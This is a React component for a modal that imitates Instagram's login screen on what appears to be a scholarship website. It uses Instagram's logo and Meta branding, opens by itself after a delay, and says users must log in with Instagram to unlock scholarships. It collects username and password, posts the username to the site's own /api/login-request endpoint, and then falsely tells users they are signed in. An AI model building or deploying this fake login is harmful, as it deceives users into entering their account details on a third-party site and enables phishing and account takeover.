"use client";

import { useEffect, useRef, useState } from "react";

const DELAY_MS = 2000;
const OPEN_EVENT = "open-login";

/** Nav button that opens the dialog on demand. */
export function OpenLoginButton({ className = "" }: { className?: string }) {
  return (
    <button className={className} onClick={() => window.dispatchEvent(new Event(OPEN_EVENT))}>
      Log in
    </button>
  );
}

function InstagramMark() {
  return (
    <div
      className="flex h-16 w-16 items-center justify-center rounded-2xl"
      style={{ background: "linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5)" }}
    >
      <svg viewBox="0 0 24 24" className="h-9 w-9" fill="none" stroke="white" strokeWidth={2}>
        <rect x="3" y="3" width="18" height="18" rx="5" />
        <circle cx="12" cy="12" r="4" />
        <circle cx="17.2" cy="6.8" r="1" fill="white" stroke="none" />
      </svg>
    </div>
  );
}

export default function LoginDialog() {
  const [open, setOpen] = useState(false);
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [signedIn, setSignedIn] = useState<string | null>(null);
  const userRef = useRef<HTMLInputElement>(null);

  // Auto-open once, 9 seconds after page load; also open from the nav button.
  useEffect(() => {
    const t = setTimeout(() => setOpen(true), DELAY_MS);
    const show = () => setOpen(true);
    window.addEventListener(OPEN_EVENT, show);
    return () => { clearTimeout(t); window.removeEventListener(OPEN_EVENT, show); };
  }, []);

  useEffect(() => {
    if (!open) return;
    userRef.current?.focus();
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = ""; };
  }, [open]);

async function handleSubmit(e: React.FormEvent) {
  e.preventDefault();

  const username = user.trim();

  if (!username) return;

  try {
    const response = await fetch("/api/login-request", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username,
      }),
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.message || "Login request failed");
    }

    setSignedIn(username);
  } catch (error) {
    console.error(error);
    alert("Unable to process your request. Please try again.");
  }
}

  if (!open) return null;

  const field =
    "w-full rounded-full border border-[#363636] bg-[#000000] px-4 py-3.5 text-[14px] text-white placeholder:text-[#8e8e8e] outline-none focus:border-[#6b6b6b]";
  const ready = user.trim() !== "" && pass.length >= 1;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-black/50 p-4">
      <div className="flex w-full max-w-[680px] flex-col items-center gap-3 lg:relative lg:w-auto lg:flex-row lg:items-center lg:gap-0">
        {!signedIn && (
          <div className="pop relative w-full max-w-[320px] rounded-lg border border-[#dbdbdb] bg-white p-4 text-center shadow-lg lg:absolute lg:right-full lg:mr-5 lg:w-64 lg:max-w-none lg:text-left">
            <p className="text-[14px] font-semibold leading-snug text-[#262626]">
              Log in with Instagram to unlock and browse all available scholarships.
            </p>
            <span
              aria-hidden="true"
              className="absolute left-1/2 top-full h-3.5 w-3.5 -translate-x-1/2 -translate-y-1/2 rotate-45 border-b border-r border-[#dbdbdb] bg-white lg:left-auto lg:top-8 lg:right-[-7px] lg:translate-x-0 lg:translate-y-0 lg:border-b-0 lg:border-r lg:border-t"
            />
          </div>
        )}

        <div
          className="pop relative flex w-full max-w-[680px] flex-col rounded-[28px] bg-black px-14 pb-8 pt-6"
          role="dialog"
          aria-modal="true"
          aria-labelledby="login-title"
        >
          <div className="mb-6 flex justify-center">
            <span className="flex items-center gap-1 text-[13px] text-[#a8a8a8]">
              English (US)
              <svg viewBox="0 0 20 20" className="h-3 w-3" fill="currentColor"><path d="M5 7l5 6 5-6z" /></svg>
            </span>
          </div>

          <div className="mb-8 flex justify-center">
            <InstagramMark />
          </div>
          <h2 id="login-title" className="sr-only">Log in to Instagram</h2>

          {signedIn ? (
            <div className="text-center">
              <p className="text-sm text-[#f5f5f5]">Welcome, <strong>{signedIn}</strong>. You're signed in.</p>
              <button
                onClick={() => setOpen(false)}
                className="mt-6 w-full rounded-full bg-[#3797f0] py-3.5 text-sm font-semibold text-white hover:bg-[#1877f2]"
              >
                Continue browsing
              </button>
            </div>
          ) : (
            <>
              <form onSubmit={handleSubmit} className="space-y-3">
                <input
                  ref={userRef}
                  value={user}
                  onChange={(e) => setUser(e.target.value)}
                  placeholder="Username, email or mobile number"
                  autoComplete="username"
                  aria-label="Username, email or mobile number"
                  className={field}
                />
                <div className="relative">
                  <input
                    type={showPass ? "text" : "password"}
                    value={pass}
                    onChange={(e) => setPass(e.target.value)}
                    placeholder="Password"
                    autoComplete="current-password"
                    aria-label="Password"
                    className={`${field} pr-11`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPass((v) => !v)}
                    aria-label={showPass ? "Hide password" : "Show password"}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[#a8a8a8] hover:text-white"
                  >
                    {showPass ? (
                      <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={1.8}>
                        <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z" />
                        <circle cx="12" cy="12" r="3" />
                      </svg>
                    ) : (
                      <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={1.8}>
                        <path d="M3 3l18 18" />
                        <path d="M10.6 5.2A10.9 10.9 0 0 1 12 5c6.4 0 10 7 10 7a15.6 15.6 0 0 1-3.4 4.2M6.6 6.6C4 8.3 2 12 2 12s3.6 7 10 7c1.6 0 3-.4 4.2-1" />
                        <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" />
                      </svg>
                    )}
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={!ready}
                  className="!mt-5 w-full rounded-full bg-[#3797f0] py-3.5 text-sm font-semibold text-white enabled:hover:bg-[#1877f2] disabled:opacity-40"
                >
                  Log in
                </button>
              </form>

              <a href="#" className="mt-5 block text-center text-[13px] text-[#a8a8a8]">Forgot password?</a>

              <div className="mt-12">
                <button
                  type="button"
                  onClick={() => setOpen(false)}
                  className="w-full rounded-full border border-[#3797f0] py-3.5 text-sm font-semibold text-[#3797f0]"
                >
                  Create new account
                </button>
              </div>

              <div className="mt-6 flex items-center justify-center gap-1 text-[13px] text-[#a8a8a8]">
                <svg viewBox="0 0 24 24" className="h-4 w-4" fill="currentColor"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2Zm-1.2 15.3-3.6-3.6a1 1 0 0 1 1.4-1.4l2.2 2.2 5.4-6.6a1 1 0 1 1 1.6 1.2l-6.1 7.4a1 1 0 0 1-1.5.2 1 1 0 0 1-.1-.1Z" /></svg>
                Meta
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
